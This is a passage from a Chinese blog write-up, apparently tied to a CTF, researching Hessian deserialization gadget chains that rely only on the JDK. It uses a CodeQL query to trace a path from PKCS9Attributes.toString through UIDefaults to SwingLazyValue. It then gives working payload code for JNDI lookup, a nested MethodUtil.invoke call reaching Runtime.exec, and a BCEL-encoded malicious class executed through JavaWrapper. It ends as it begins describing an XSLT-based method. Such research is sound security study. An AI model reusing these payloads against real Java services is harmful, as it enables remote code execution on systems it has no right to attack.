+<p>具体的jdk数据库我用的是现成的，因为lgtm网站上的数据库暂时找不到了，但是找到一篇专门做codeql生成jdk数据库的文章，该文文末有数据库地址https://blog.csdn.net/mole_exp/article/details/122330521</p>
+<p>Callable类型表示要调用CG（Call
+Graph）拉进行查询可以在方法调用图中进行信息查找</p>
+<p>类Call可以代表method call、new expr、cons中的this or super。</p>
+<p>A Callable 代表一个 method or constructor。</p>
+<p>最终结合文章https://www.cnblogs.com/kingbridge/articles/16717030.html，我们可以写出如下的一段针对于该函数调用的查询方式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> * @id jdktest/1-1</span><br><span class="line"> * @severity error</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line"></span><br><span class="line">class ROMethod extends Method&#123;</span><br><span class="line">    ROMethod()&#123;</span><br><span class="line">        this.hasName(&quot;toString&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Source extends Callable &#123;</span><br><span class="line">    Source()&#123;</span><br><span class="line">        (</span><br><span class="line">            this instanceof ROMethod</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class GetMethod extends Method &#123;</span><br><span class="line">GetMethod()&#123;</span><br><span class="line">        this.hasName(&quot;get&quot;) and</span><br><span class="line">        this.getDeclaringType().getAnAncestor().hasQualifiedName(&quot;java.util&quot;,&quot;Hashtable&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class DangerousMethod extends Callable &#123;</span><br><span class="line">    DangerousMethod()&#123;</span><br><span class="line">        this instanceof GetMethod </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class CallsDangerousMethod extends Callable &#123;</span><br><span class="line"></span><br><span class="line">    CallsDangerousMethod() &#123;</span><br><span class="line">        exists(Callable a| this.polyCalls(a) and </span><br><span class="line">        a instanceof DangerousMethod )</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">query predicate edges(Method a, Method b) &#123; </span><br><span class="line">    a.polyCalls(b) </span><br><span class="line">    and</span><br><span class="line">    a.getDeclaringType().getAField().getDeclaringType().hasName(b.getDeclaringType().getName())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Source source, CallsDangerousMethod sink</span><br><span class="line">where edges+(source, sink)</span><br><span class="line">select source, source, sink, &quot;$@ $@ to $@ $@&quot; ,</span><br><span class="line">source.getDeclaringType(),source.getDeclaringType().getName(),</span><br><span class="line">source,source.getName(),</span><br><span class="line">sink.getDeclaringType(),sink.getDeclaringType().getName(),</span><br><span class="line">sink,sink.getName() </span><br></pre></td></tr></table></figure>
+<p>这里可能是由于jdk版本的不同，我这里可以查询到三个符合该调用关系的半段调用链</p>
+<img data-src="/2024/08/13/Hessian%E4%BB%85%E5%9C%A8JDK%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE%E7%A0%94%E7%A9%B6/3.png" class>
+<p>大多数wp上面写的利用链都是通过sun.security.pkcs.PKCS9Attributes当中的toString进行的，该方法的代码如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> PKCS9Attribute <span class="title function_">getAttribute</span><span class="params">(ObjectIdentifier oid)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> attributes.get(oid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们只需要把attributes赋值成UIDefaults就可以实现调用链的拼接了，此时的oid变量一定要是ObjectIdentifier类型的变量我们可以从PKCS9Attribute的常量里面去拿。</p>
+<p>现在我们的调用栈已经成了下面这个样子</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">createValue:<span class="number">73</span>, SwingLazyValue (sun.swing)</span><br><span class="line">getFromHashtable:<span class="number">216</span>, UIDefaults (javax.swing)</span><br><span class="line">get:<span class="number">161</span>, UIDefaults (javax.swing)</span><br><span class="line">getAttribute:<span class="number">265</span>, PKCS9Attributes (sun.security.pkcs)</span><br><span class="line">toString:<span class="number">334</span>, PKCS9Attributes (sun.security.pkcs)</span><br></pre></td></tr></table></figure>
+<h5 id="payload构造">payload构造</h5>
+<p>在之前的分析当中我们知道SwingLazyValue的createValue方法能够调用任意类的静态方法，在该题目当中wp里面给出了一些有意思的静态方法，其中的具体应用在下文https://yzddmr6.com/posts/swinglazyvalue-in-webshell/也有具体的描述。</p>
+<h6 id="利用方式其一">利用方式其一</h6>
+<p>java.naming.InitialContext#doLookup()</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">doLookup</span><span class="params">(Name name)</span></span><br><span class="line">    <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">return</span> (T) (<span class="keyword">new</span> <span class="title class_">InitialContext</span>()).lookup(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>利用payload如下，下面仅有关于从toString开始的部分。当然这种利用方式有高版本无法进行JDNI注入的限制，当然高版本可以使用本地beanfactory进行绕过（tomcat的依赖）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SwingLazyValue</span> <span class="variable">value</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;javax.naming.InitialContext&quot;</span>, <span class="string">&quot;doLookup&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;ldap://127.0.0.1:9999&quot;</span>&#125;);</span><br><span class="line"><span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">uiDefaults.put(PKCS9Attribute.CONTENT_TYPE_OID,value);</span><br><span class="line">Object o= obj(<span class="string">&quot;sun.security.pkcs.PKCS9Attributes&quot;</span>);</span><br><span class="line">setFieldValue(o,<span class="string">&quot;attributes&quot;</span>,uiDefaults);</span><br><span class="line">o.toString();</span><br></pre></td></tr></table></figure>
+<h6 id="利用方式其二">利用方式其二</h6>
+<p><strong>sun.reflect.misc.MethodUtil#invoke+Runtime.exec</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">invoke</span><span class="params">(Method var0, Object var1, Object[] var2)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> bounce.invoke((Object)<span class="literal">null</span>, var0, var1, var2);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException var5) &#123;</span><br><span class="line">        <span class="type">Throwable</span> <span class="variable">var4</span> <span class="operator">=</span> var5.getCause();</span><br><span class="line">        <span class="keyword">if</span> (var4 <span class="keyword">instanceof</span> InvocationTargetException) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (InvocationTargetException)var4;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var4 <span class="keyword">instanceof</span> IllegalAccessException) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (IllegalAccessException)var4;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var4 <span class="keyword">instanceof</span> RuntimeException) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (RuntimeException)var4;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var4 <span class="keyword">instanceof</span> Error) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (Error)var4;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Unexpected invocation error&quot;</span>, var4);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Unexpected invocation error&quot;</span>, var6);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>一个叫简单粗暴的方法，直接就是反射调用任意方法，但是值得一提的，我们需要嵌套两层MethodUtil#invoke。因为在第一次调用的时候会使用getMethod去找输入对象当中的对应方法，根据我们预设的参数类型去找，如果此时我们的payload是如下形式的话，再获取方法的阶段会发生异常。因为invoke方法的参数类型(Method
+var0, Object var1, Object[]
+var2)没有Runtime类型的对象runtime过不了审核。</p>
+<img data-src="/2024/08/13/Hessian%E4%BB%85%E5%9C%A8JDK%E4%B8%8B%E7%9A%84%E5%88%A9%E7%94%A8%E9%93%BE%E7%A0%94%E7%A9%B6/4.jpg" class>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> Runtime.class.getMethod(<span class="string">&quot;exec&quot;</span>,String[].class);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">SwingLazyValue</span> <span class="variable">value</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;sun.reflect.misc.MethodUtil&quot;</span>, <span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;exec, runtime, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;);</span><br></pre></td></tr></table></figure>
+<p>但是我们可以多嵌套一层methodutil.invoke，这样的话既可以避免getmethod的严格审查，在第二次调用的时候就不需要审查了，因为是invoke函数唤起的。因此我们可以拼凑出如下的payload，下述代码同样可以完成命令执行</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">        <span class="type">Method</span> <span class="variable">invoke</span> <span class="operator">=</span> MethodUtil.class.getMethod(<span class="string">&quot;invoke&quot;</span>, Method.class, Object.class, Object[].class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> Runtime.class.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">SwingLazyValue</span> <span class="variable">value</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;sun.reflect.misc.MethodUtil&quot;</span>, <span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;invoke, <span class="keyword">new</span> <span class="title class_">Object</span>(), <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;exec, runtime, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;&#125;);</span><br><span class="line"><span class="comment">//        Method invoke = MethodUtil.class.getMethod(&quot;invoke&quot;, Method.class, Object.class, Object[].class);</span></span><br><span class="line"><span class="comment">//        Method exec = Runtime.class.getMethod(&quot;exec&quot;, String[].class);</span></span><br><span class="line"><span class="comment">//        String[] command = new String[]&#123;&quot;calc&quot;&#125;;</span></span><br><span class="line"><span class="comment">//        SwingLazyValue value = new SwingLazyValue(&quot;sun.reflect.misc.MethodUtil&quot;, &quot;invoke&quot;, new Object[]&#123;invoke, new Object(), new Object[]&#123;exec, Runtime.getRuntime(), new Object[]&#123;command&#125;&#125;&#125;);</span></span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        uiDefaults.put(PKCS9Attribute.CONTENT_TYPE_OID,value);</span><br><span class="line">        Object o= obj(<span class="string">&quot;sun.security.pkcs.PKCS9Attributes&quot;</span>);</span><br><span class="line">        setFieldValue(o,<span class="string">&quot;attributes&quot;</span>,uiDefaults);</span><br><span class="line">        o.toString();</span><br></pre></td></tr></table></figure>
+<h6 id="利用方式其三">利用方式其三</h6>
+<p>com.sun.org.apache.bcel.internal.util.JavaWrapper#_main</p>
+<p>想要了解这个利用方法建议先去看看https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html讲了关于bcel相关库的发展历史。但是当初的bcelclassloader早就已经被移出了jdk，现在我们并不能使用，但是可以参考该文章的bcel字节码生成方式。但是这种方式有版本的限制，比如我使用如下的代码段进行BCEL字节码的生成：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestBcel</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(StaticEvil.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(javaClass.getBytes(), <span class="literal">true</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;$$BCEL$$&quot;</span> + code);</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span> + code).newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在jdk8u202当中生成的BCEL字节码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmPMO$c2$40$Q$7d$L$95B$ad$80$f8$85$dfr$S$3d$d8$8b7$8c$X$a3$X$ebG$c4$e8yY7u$b1$b4$a4$y$84$7f$e4$99$8b$g$P$fe$A$7f$94q$ba$S$n$d1Mf$s$f3f$de$9b$99$fd$fcz$ff$Ap$88$9a$D$h$8b$O$96$b0$9c$c7J$g$ab6Vm$ac$d9Xg$c8$j$a9H$e9c$86l$7d$ef$8e$c1$3a$89$l$qC$c9W$91$bc$ecwZ2$b9$e5$ad$90$90$8a$l$L$k$de$f1D$a5$f9$Y$b4$f4$a3$ea1T$fd8$J$3c9$e4$9dn$u$bd$a6$e6Z$89$d3$81$K$h$M$f9$p$R$8e$H$ccQA$3c$5d$f0$ae$n$d3$K$MN3$ee$tB$9e$a9T$ac4$n$k$b4$f9$80$bb$c8$a3$60c$c3$c5$s$b6h$W$8d$X$$$b6$b1$c3$b0$90$d6$bd$90G$81w$3a$U$b2$abU$i1$y$ff$bf$FCy$d2$7e$d5jK$a1$Z$e6$t$d0M$3f$d2$aaC$L8$81$d4$bf$c9R$7d$cf$ff$d3C$HYr$u$F$c3n$7d$aa$da$d4$89$8a$82$c64$e1$3a$89$85$ec$f5$g$a8$nG$df$9f$be$MXz$Ry$872$8f$o$a38$b3$ff$K62$e5Y$f29$Df$e1$92w$7f$g0$87$o$c5$3cJ$bf$e4$x$p$G$U$df$90$a9d_$60$dd$3f$c3$3a$l$Z$ac$40$bc$ZRH$d5$w$b0$8cf$c1$a06$v9F9CV$s$b3$91$f1m$cc$83$88$V$D$_$7c$D$9d$J$82$976$C$A$A</span><br></pre></td></tr></table></figure>
+<p>可是在jdk8u281当中由于ClassLoader被移除了，我们生成的BCEL字节码如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$BCEL$$$l$8b$I$A$A$A$A$A$A$A</span><br></pre></td></tr></table></figure>
+<p>所以在生成时就要注意使用jdk的版本问题，接下来再来看com.sun.org.apache.bcel.internal.util.JavaWrapper当中的_main以及runMain方法。逻辑很简单就是通过_main方法调用runMain从而调用我们恶意类当中的_main方法进而触发恶意代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">runMain</span><span class="params">(String class_name, String[] argv)</span> <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">Class</span>   <span class="variable">cl</span>    <span class="operator">=</span> loader.loadClass(class_name);</span><br><span class="line">  <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    method = cl.getMethod(<span class="string">&quot;_main&quot;</span>,  <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; argv.getClass() &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Method _main is sane ?</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span>   <span class="variable">m</span> <span class="operator">=</span> method.getModifiers();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">r</span> <span class="operator">=</span> method.getReturnType();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(Modifier.isPublic(m) &amp;&amp; Modifier.isStatic(m)) ||</span><br><span class="line">       Modifier.isAbstract(m) || (r != Void.TYPE))</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>();</span><br><span class="line">  &#125; <span class="keyword">catch</span>(NoSuchMethodException no) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;In class &quot;</span> + class_name +</span><br><span class="line">                       <span class="string">&quot;: public static void _main(String[] argv) is not defined&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    method.invoke(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; argv &#125;);</span><br><span class="line">  &#125; <span class="keyword">catch</span>(Exception ex) &#123;</span><br><span class="line">    ex.printStackTrace();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">_main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">  <span class="comment">/* Expects class name as first argument, other arguments are by-passed.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">if</span>(argv.length == <span class="number">0</span>) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Missing class name.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">String</span> <span class="variable">class_name</span> <span class="operator">=</span> argv[<span class="number">0</span>];</span><br><span class="line">  String[] new_argv = <span class="keyword">new</span> <span class="title class_">String</span>[argv.length - <span class="number">1</span>];</span><br><span class="line">  System.arraycopy(argv, <span class="number">1</span>, new_argv, <span class="number">0</span>, new_argv.length);</span><br><span class="line"></span><br><span class="line">  <span class="type">JavaWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JavaWrapper</span>();</span><br><span class="line">  wrapper.runMain(class_name, new_argv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>为此我们需要构建一个含有public static void _main(String[]
+argv)方法的恶意类，并在这个方法里面写上我们想要执行的命令</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StaticEvil</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">_main</span><span class="params">(String[] argv)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后使用上面的BCEL字节码生成代码生成对应的BCEL字节码，就可以进行利用，payload如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQMO$db$40$Q$7d$9b8q$ec$9a$84$Eh$v$85$b6$d0VMz$c0$Xn$a9$b8$mz2$FA$FB$3d$a0$cd$b22$9b$fa$p$dal$a2$fc$p$ce$5c$Aq$e0$H$f0$a3$Q$b3$$j$90$gK$3bO3$fb$f6$bd$99$f1$c3$e3$dd$3d$80$z$7c$f1$e1b$d9$c7$5b$ac$d4$f0$ce$e2$aa$8b5$X$ef$5d$7c$60$a8$7eW$992$db$M$e5v$e7$98$c1$d9$c9$cf$rC$pR$99$fc9J$7bR$ff$e2$bd$84$w$ad$u$X$3c9$e6Z$d9$fc$b9$e8$98$L5dX$8er$j$87r$c2$d3A$o$c3$p$c3$8d$S$bbc$95t$Z$wg$vW$Z$c3$eb$f6$ef$a8$cf$c7$3cLx$W$TE$ab$y$ee$W$86$5c$c7c$86$85$Z$d7$Ms$a4$r$fe$ec$f1A$e1G$5d3$cc$efIs$91$9f$lp$cdSi$a4$s$7b$ff$u$li$n$7f$u$dbRcj$bfi$V$D$d4$e0$b9$f8$Y$60$j$hdGC$88$A$9f$f0$99$3c$a7$8e$bb$T$n$HF$e5$b6$d3$d9$b3$90$f3$94$be$df$ebKa$Y$9a$d3$d2$e1$u3$w$a5$G$fcX$9a$7f$c9R$bb$T$fd$c7$a1$c1$i9$91$82$e1k$7b$c6R$5e$94$Ot$$$e4p$d8$a5$de$ab$f4$T$edW$C$b3$TQ$f4$v$L$J$Za$e5$db$N$d8Uq$fd$8ab$b5$u$96$RP$M$fe$S0$87$3a$a1$87$G$e6$89e$l$9f$S$96$I$eb$b7$u$b5$ca$d7pN$$$e1DW$F$df$a3w$VR$b0j$z8$85$a6WT$5dR$f2_$u$d7$d1$q$G$b0$40$c7E$vr$b1$I$yYK$da$P$Bm$b4$e8$eb$cd$T$D$F$he$91$C$A$A&quot;</span>;</span><br><span class="line"><span class="type">SwingLazyValue</span> <span class="variable">value</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.JavaWrapper&quot;</span>, <span class="string">&quot;_main&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;s&#125;&#125;);</span><br><span class="line"><span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">uiDefaults.put(PKCS9Attribute.CONTENT_TYPE_OID,value);</span><br><span class="line">Object o= obj(<span class="string">&quot;sun.security.pkcs.PKCS9Attributes&quot;</span>);</span><br><span class="line">setFieldValue(o,<span class="string">&quot;attributes&quot;</span>,uiDefaults);</span><br><span class="line">o.toString();</span><br></pre></td></tr></table></figure>
+<h6 id="利用方式其四">利用方式其四</h6>
+<p>再次之前需要掌握一些xslt文档的基础知识</p>
+<p>1.xsl:variable元素通常在xsl:template或其他包含元素内部使用，以便在特定范围内定义变量。它具有以下常见的属性：</p>
+<p>name：指定变量的名称，用于在后续的表达式或元素中引用该变量。
+select：可选属性，用于指定变量的初始值。它可以是一个XPath表达式，用于计算变量的初始值。</p>
+<p>2.xmlns声明也用于指定XSLT命名空间，其中常见的命名空间是xmlns:xsl="http://www.w3.org/1999/XSL/Transform"。这样，XSLT文件可以使用XSLT语法和指令来进行样式转换和转换规则定义。</p>
+<p>3.在xsl:template元素中，使用match="/"指定了根节点的匹配规则。这意味着当应用此样式表时，该模板将用于转换XML文档的根节点。恶意的xslt文件代码如下</p>
